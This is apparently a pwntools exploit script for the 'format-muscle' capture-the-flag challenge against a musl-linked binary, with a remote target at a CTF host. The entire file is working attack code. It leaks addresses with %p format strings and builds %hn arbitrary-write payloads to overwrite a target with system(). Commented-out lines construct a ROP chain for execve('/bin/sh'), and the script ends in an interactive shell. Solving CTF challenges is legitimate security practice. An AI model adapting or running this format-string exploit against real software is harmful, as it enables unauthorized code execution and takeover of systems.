from pwn import *
from icecream import ic

elf = exe = ELF("./format-muscle_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-musl-x86_64.so.1")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("format-muscle.chal.crewc.tf", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x00000000000011f5
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

payload = b''
for i in range(40):
    payload += b"%p."
sl(payload)
ru("0.0.")
ld.address = int(ru(".")[:-1].strip().decode(), 16) - 0xae260
ru(".0.0.")
elf.address = int(ru(".")[:-1].strip().decode(), 16) - 0x1199
ru(".")
return_address = int(ru(".")[:-1].strip().decode(), 16) - 0x40

ic(hex(ld.address))
ic(hex(elf.address))
ic(hex(return_address))
off = ld.address + 0xad1c0
# pause()
# payload = b'aaaa.%p\x00'
# sl(payload)
# payload = fmtstr_payload(7, {return_address:0x1000})
# print(payload)

# payload = b""
# payload = b"%1c%1c%1c%1c%1c%1c%1c%1c%1c%1c%1c%1c"
# payload += b"%10c%hhn"
# payload = payload.ljust(0x40, b'a')
# payload += p64(off)
# print(payload)
# sl(payload)
def pretty(addr, vall):
    aa = vall%0x10000
    bb = (vall//0x10000)%0x10000
    cc = (vall//0x100000000)%0x10000

    val = {}
    val[aa] = addr    
    val[bb] = addr+2    
    val[cc] = addr+4   
    ic(val)

    keys = list(val.keys())
    keys.sort()

    a = keys[0]
    addr1 = val[a]
    b = keys[1]
    addr2 = val[b]
    c = keys[2]
    addr3 = val[c]

    tmp = f"%{a-19}c".encode()  
    tmp += b"%1c"*19
    tmp += f"%hn%{b-a}c%hn%{c-b}c%hn".encode() 
    tmp += b"A"*(120 - len(tmp))
    tmp += p64(addr1)
    tmp += b"B"*8
    tmp += p64(addr2)
    tmp += b"B"*8
    tmp += p64(addr3)

    ic(hex(a), hex(b), hex(c))
    ic(hex(vall))

    return tmp


# payload = pretty(return_address-16, 0x732f6e69622f)
# sl(payload)

# payload = pretty(return_address-10, 0x00000068)
# sl(payload)

# pop_rax = ld.address + 0x0000000000016a86
# pop_rdi = ld.address + 0x00000000000152a1
# pop_rsi = ld.address + 0x000000000001b0a1
# pop_rdx = ld.address + 0x000000000002a50b
# syscall = ld.address + 0x0000000000021270

# payload = pretty(return_address, pop_rax)
# sl(payload)
# payload = pretty(return_address+8, 59)
# sl(payload)
# payload = pretty(return_address+16, pop_rdi)
# sl(payload)
# payload = pretty(return_address+24, return_address-16)
# sl(payload)
# payload = pretty(return_address+32, pop_rsi)
# sl(payload)
# payload = pretty(return_address+40, 0)
# sl(payload)
# payload = pretty(return_address+48, pop_rdx)
# sl(payload)
# payload = pretty(return_address+56, 0)
# sl(payload)
# payload = pretty(return_address+64, syscall)
# sl(payload)

payload = pretty(off, ld.sym['system'])
sl(payload)
io.interactive()
